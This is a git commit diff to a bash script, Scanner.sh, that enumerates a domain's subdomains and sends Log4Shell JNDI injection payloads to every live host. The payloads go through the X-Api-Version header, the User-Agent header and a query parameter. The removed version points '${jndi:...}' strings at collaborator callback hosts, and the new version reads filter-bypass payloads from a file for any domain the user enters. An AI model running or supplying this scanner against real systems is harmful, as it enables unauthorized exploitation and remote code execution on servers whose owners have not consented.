66ab374292c9e3b3cd2b4597d3ba65619e35a915
Som Chandra <85082756+Somchandra17@users.noreply.github.com>
2024-04-19 18:56:32 +0530

    Update Scanner.sh

--- Scanner.sh
+++ Scanner.sh
@@ -1,8 +1,15 @@
-while read -r collaborator_link; do
-    subfinder -d domain.com -silent | httprobe | while read url; do 
-        case1=$(curl -s "$url" -H "X-Api-Version: \${jndi:$collaborator_link}")
-        case2=$(curl -s "$url/?test=\${jndi:$collaborator_link}")
-        case3=$(curl -s "$url" -H "User-Agent: \${jndi:$collaborator_link}")
-        echo -e "\033[43mDOMAIN => $url\033[0m\n Case1=> X-Api-Version: running-Ldap-payload\n Case2=> Useragent: running-Ldap-payload\n Case3=> $url/?test=running-Ldap-payload\n"
-    done
-done < collaborator_links.txt
+#!/bin/bash
+
+# Prompt the user for the domain
+read -p "Enter the domain: " domain
+
+# Read the payload bypasses from bypass_payload.txt
+while IFS= read -r payload; do
+    echo "Scanning with payload: $payload"
+    while read -r url; do
+        case1=$(curl -s "$url" -H "X-Api-Version: ${payload}")
+        case2=$(curl -s "$url/?test=${payload}")
+        case3=$(curl -s "$url" -H "User-Agent: ${payload}")
+        echo -e "\033[43mDOMAIN => $url\033[0m\n Case1=> X-Api-Version: $payload\n Case2=> Useragent: $payload\n Case3=> $url/?test=$payload\n"
+    done < <(subfinder -d "$domain" -silent | httprobe)
+done < bypass_payload.txt
